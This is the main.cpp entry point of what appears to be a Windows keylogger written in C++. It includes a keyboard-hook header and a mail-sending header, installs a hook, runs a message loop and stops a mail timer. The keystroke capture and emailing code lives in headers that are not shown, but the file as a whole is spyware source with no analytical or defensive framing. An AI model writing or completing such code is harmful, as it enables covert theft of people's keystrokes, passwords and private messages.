// main.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
	//cout << "Hello world!" << endl;

	MSG msg;
	IO::MkDir(IO::getOurPath(true));
	installHook();
	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	MailTimer.stop();
	return 0;
}
